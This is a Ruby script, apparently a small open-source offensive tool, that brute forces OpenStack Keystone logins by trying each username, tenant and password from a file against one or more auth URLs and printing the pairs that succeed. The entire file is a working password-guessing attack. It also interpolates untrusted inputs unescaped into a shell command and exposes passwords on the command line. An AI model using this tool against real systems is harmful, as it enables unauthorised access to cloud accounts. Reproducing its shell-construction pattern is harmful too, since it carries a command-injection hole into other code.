#!/usr/bin/env ruby
# A script to brute force keystone credentials.
# by Miles Whittaker <mjwhitta@gmail.com>
#
# --------------------------------------------------------------------
# The MIT License (MIT)
#
# Copyright (c) 2017 Miles Whittaker
#
# Permission is hereby granted, free of charge, to any person
# obtaining a copy of this software and associated documentation files
# (the "Software"), to deal in the Software without restriction,
# including without limitation the rights to use, copy, modify, merge,
# publish, distribute, sublicense, and/or sell copies of the Software,
# and to permit persons to whom the Software is furnished to do so,
# subject to the following conditions:
#
# The above copyright notice and this permission notice shall be
# included in all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
# NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS
# BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
# ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
# CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
# --------------------------------------------------------------------

require "io/wait"
require "optparse"
require "pathname"

class Exit
    GOOD = 0
    INVALID_OPTION = 1
    INVALID_ARGUMENT = 2
    MISSING_ARGUMENT = 3
    EXTRA_ARGUMENTS = 4
    EXCEPTION = 5
    AMBIGUOUS_ARGUMENT = 6
end

def parse(args)
    options = Hash.new
    options["verbose"] = false

    info = "Try to brute force keytone credientials."

    parser = OptionParser.new do |opts|
        opts.summary_width = 19

        opts.banner = "Usage: #{File.basename($0)} [OPTIONS]"

        opts.on("", "DESCRIPTION")

        info.scan(/\S.{0,76}\S(?=\s|$)|\S+/).each do |line|
            opts.on("    #{line}")
        end

        opts.on("", "OPTIONS")

        opts.on(
            "-a",
            "--auth_url=URL",
            "Either a url or a file containing one url per line"
        ) do |url|
            options["urls"] = Array.new
            if (Pathname(url).exist?)
                File.open(url).each do |line|
                    if (!line.start_with?("#"))
                        options["urls"].push(line.lstrip.rstrip)
                    end
                end
            else
                options["urls"].push(url)
            end
        end

        opts.on(
            "-c",
            "--creds=CREDS",
            "A file containing one set of creds per line"
        ) do |creds|
            options["creds"] = Array.new
            if (Pathname(creds).exist?)
                File.open(creds).each do |line|
                    if (!line.start_with?("#"))
                        options["creds"].push(line.lstrip.rstrip)
                    end
                end
            else
                puts "#{creds} does not exist!"
                exit Exit::INVALID_OPTION
            end
        end

        opts.on("-h", "--help", "Display this help message") do
            puts opts
            exit Exit::GOOD
        end

        opts.on(
            "-v",
            "--verbose",
            "Show backtrace when error occurs"
        ) do
            options["verbose"] = true
        end
    end

    begin
        parser.parse!(args)
    rescue OptionParser::InvalidOption => e
        puts e.message
        puts parser
        exit Exit::INVALID_OPTION
    rescue OptionParser::InvalidArgument => e
        puts e.message
        puts parser
        exit Exit::INVALID_ARGUMENT
    rescue OptionParser::MissingArgument => e
        puts e.message
        puts parser
        exit Exit::MISSING_ARGUMENT
    rescue OptionParser::AmbiguousOption => e
        puts e.message
        puts parser
        exit Exit::AMBIGUOUS_ARGUMENT
    end

    if (!args.empty?)
        puts parser
        exit Exit::EXTRA_ARGUMENTS
    end

    return options
end

options = parse(ARGV)

begin
    options["urls"].each do |url|
        puts "### #{url} ###"
        options["creds"].each do |cred|
            username, tenant, pass = cred.split(" ")
            cmd = [
                "keystone",
                "--os_auth_url #{url}",
                "--os_username #{username}",
                "--os_tenant_name #{tenant}",
                "--os_password #{pass}",
                "catalog 2>/dev/null"
            ].join(" ")
            value = %x(#{cmd})
            if (!value.empty?)
                puts " |_ #{username}:#{pass} ###"
            end
        end
        puts
    end
rescue Interrupt
    # ^C
    # Exit gracefully
rescue Errno::EPIPE
    # Do nothing. This can happen if piping to another program such as
    # less. Usually if less is closed before we're done with STDOUT.
rescue Exception => e
    $stderr.puts "Oops! Looks like an error has occured! Maybe the " \
        "message below will help. If not,"
    $stderr.puts "you can use the --verbose flag to get a backtrace."

    $stderr.puts e.message
    if (options["verbose"])
        e.backtrace.each do |line|
            $stderr.puts line
        end
    end
    exit Exit::EXCEPTION
end
exit Exit::GOOD
